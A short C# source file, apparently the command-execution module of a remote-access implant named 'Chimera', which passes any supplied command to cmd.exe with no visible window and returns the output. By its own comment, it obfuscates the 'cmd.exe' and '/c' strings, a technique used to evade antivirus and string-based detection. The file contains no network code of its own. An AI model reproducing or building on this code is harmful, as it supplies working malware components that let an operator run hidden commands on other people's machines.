using System;
using System.Diagnostics;

namespace Chimera.Commands
{
    public static class Shell
    {
        public static string Execute(string command)
        {
            try
            {
                if (string.IsNullOrEmpty(command))
                    return "No command specified";

                var psi = new ProcessStartInfo
                {
                    // Use obfuscated strings for cmd.exe and /c
                    FileName  = StringHelper.Decode(StringHelper.CMD),
                    Arguments = StringHelper.Decode(StringHelper.SLASH_C) + " " + command,

                    // Capture output
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true,

                    // Run in system32 dir to avoid path issues
                    WorkingDirectory = Environment.GetFolderPath(
                        Environment.SpecialFolder.System)
                };

                using (var proc = Process.Start(psi))
                {
                    string stdout = proc.StandardOutput.ReadToEnd();
                    string stderr = proc.StandardError.ReadToEnd();
                    proc.WaitForExit();

                    string result = stdout;
                    if (!string.IsNullOrEmpty(stderr))
                        result += "\n[stderr]\n" + stderr;

                    return string.IsNullOrEmpty(result) ? "(no output)" : result;
                }
            }
            catch (Exception ex)
            {
                return $"[error] {ex.Message}";
            }
        }
    }
}
